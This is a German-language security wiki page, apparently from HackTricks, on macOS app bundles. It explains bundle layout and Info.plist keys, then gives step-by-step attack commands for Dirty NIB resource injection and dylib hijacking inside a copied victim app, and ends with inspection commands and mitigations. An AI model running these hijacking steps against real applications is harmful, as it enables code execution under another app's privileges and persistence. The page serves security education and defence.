# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Bundles dienen in macOS als Container für verschiedene Ressourcen, darunter Anwendungen, Libraries und andere erforderliche Dateien. Dadurch erscheinen sie im Finder als einzelne Objekte, beispielsweise die bekannten `*.app`-Dateien. Das am häufigsten anzutreffende Bundle ist das `.app`-Bundle, obwohl auch andere Typen wie `.framework`, `.systemextension` und `.kext` weit verbreitet sind.

### Wichtige Bestandteile eines Bundles

In einem Bundle, insbesondere im Verzeichnis `<application>.app/Contents/`, befinden sich verschiedene wichtige Ressourcen:

- **\_CodeSignature**: Dieses Verzeichnis enthält wichtige Code-Signing-Informationen zur Überprüfung der Integrität der Anwendung. Die Code-Signing-Informationen können mit Befehlen wie den folgenden eingesehen werden:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Enthält die ausführbare Binärdatei der Anwendung, die bei einer Benutzerinteraktion ausgeführt wird.
- **Resources**: Ein Repository für die Benutzeroberflächenkomponenten der Anwendung, einschließlich Bildern, Dokumenten und Schnittstellenbeschreibungen (nib/xib-Dateien).
- **Info.plist**: Dient als zentrale Konfigurationsdatei der Anwendung und ist entscheidend dafür, dass das System die Anwendung korrekt erkennt und mit ihr interagiert.

#### Wichtige Schlüssel in Info.plist

Die Datei `Info.plist` ist ein zentraler Bestandteil der Anwendungskonfiguration und enthält Schlüssel wie:

- **CFBundleExecutable**: Gibt den Namen der ausführbaren Hauptdatei im Verzeichnis `Contents/MacOS` an.
- **CFBundleIdentifier**: Liefert eine globale Kennung für die Anwendung, die macOS umfassend zur Anwendungsverwaltung verwendet.
- **LSMinimumSystemVersion**: Gibt die minimale macOS-Version an, die für die Ausführung der Anwendung erforderlich ist.

### Bundles untersuchen

Um den Inhalt eines Bundles wie `Safari.app` zu untersuchen, kann folgender Befehl verwendet werden: `bash ls -lR /Applications/Safari.app/Contents`

Diese Untersuchung zeigt Verzeichnisse wie `_CodeSignature`, `MacOS` und `Resources` sowie Dateien wie `Info.plist`. Jedes dieser Elemente erfüllt einen eigenen Zweck, von der Absicherung der Anwendung bis zur Definition ihrer Benutzeroberfläche und Betriebsparameter.

#### Zusätzliche Bundle-Verzeichnisse

Neben den üblichen Verzeichnissen können Bundles auch Folgendes enthalten:

- **Frameworks**: Enthält die von der Anwendung verwendeten gebündelten Frameworks. Frameworks ähneln dylibs, enthalten jedoch zusätzliche Ressourcen.
- **PlugIns**: Ein Verzeichnis für Plug-ins und Erweiterungen, die die Funktionen der Anwendung erweitern.
- **XPCServices**: Enthält von der Anwendung verwendete XPC-Services für die Kommunikation außerhalb des Prozesses.

Diese Struktur stellt sicher, dass alle erforderlichen Komponenten innerhalb des Bundles gekapselt sind, und ermöglicht dadurch eine modulare und sichere Anwendungsumgebung.

Ausführlichere Informationen zu `Info.plist`-Schlüsseln und ihrer Bedeutung bietet die Apple-Entwicklerdokumentation: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Sicherheitshinweise & Abuse Vectors

- **Gatekeeper / App Translocation**: Wenn ein unter Quarantäne gestelltes Bundle erstmals ausgeführt wird, führt macOS eine umfassende Signaturprüfung durch und kann es von einem zufällig bestimmten translocierten Pfad ausführen. Nach der Bestätigung werden bei späteren Starts nur oberflächliche Prüfungen durchgeführt; Ressourcendateien in `Resources/`, `PlugIns/`, nibs usw. wurden in der Vergangenheit nicht überprüft. Seit macOS 13 Ventura wird beim ersten Start eine umfassende Prüfung erzwungen, und die neue TCC-Berechtigung *App Management* schränkt Prozesse von Drittanbietern darin ein, andere Bundles ohne Zustimmung des Benutzers zu ändern. Ältere Systeme bleiben jedoch anfällig.
- **Kollisionen von Bundle Identifiern**: Mehrere eingebettete Targets (PlugIns, Hilfsprogramme), die denselben `CFBundleIdentifier` wiederverwenden, können die Signaturvalidierung beeinträchtigen und gelegentlich URL-Scheme-Hijacking bzw. -Verwechslungen ermöglichen. Sub-Bundles sollten immer aufgelistet und eindeutige IDs überprüft werden.

## Resource Hijacking (Dirty NIB / NIB Injection)

Vor Ventura konnte das Austauschen von UI-Ressourcen in einer signierten Anwendung die oberflächliche Code-Signing-Prüfung umgehen und Code Execution mit den Entitlements der Anwendung ermöglichen. Aktuelle Forschung (2024) zeigt, dass dies weiterhin auf Systemen vor Ventura und bei nicht unter Quarantäne gestellten Builds funktioniert:<sup>[1][2]</sup>

1. Die Zielanwendung an einen beschreibbaren Ort kopieren (z. B. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` (oder eine beliebige in `NSMainNibFile` deklarierte nib) durch eine bösartige Datei ersetzen, die `NSAppleScript`, `NSTask` usw. instanziiert.
3. Die Anwendung starten. Die bösartige nib wird unter der Bundle-ID und mit den Entitlements des Opfers ausgeführt (TCC-Freigaben, Mikrofon/Kamera usw.).
4. Ventura+ wirkt dem entgegen, indem das Bundle beim ersten Start umfassend überprüft wird und für spätere Änderungen die Berechtigung *App Management* erforderlich ist. Dadurch wird Persistence erschwert, Angriffe beim ersten Start auf älteren macOS-Versionen bleiben jedoch weiterhin möglich.<sup>[1]</sup>

Minimales Beispiel für eine bösartige nib-Payload (xib mit `ibtool` zu nib kompilieren):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking innerhalb von Bundles

Da `@rpath`-Lookups gebündelte Frameworks/PlugIns bevorzugen, kann das Ablegen einer schädlichen Library innerhalb von `Contents/Frameworks/` oder `Contents/PlugIns/` die Lade-Reihenfolge umleiten, wenn das Main-Binary ohne library validation oder mit einer schwachen `LC_RPATH`-Reihenfolge signiert wurde.

Typische Schritte beim Ausnutzen eines unsignierten/ad-hoc Bundles:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Eine Hardened Runtime, bei der `com.apple.security.cs.disable-library-validation` fehlt, blockiert Third-Party-Dylibs; prüfe zuerst die Entitlements.
- XPC services unter `Contents/XPCServices/` laden häufig zugehörige Frameworks – patche ihre Binaries auf ähnliche Weise für Persistence- oder Privilege-Escalation-Pfade.

## Schnellübersicht zur Inspektion
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referenzen

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
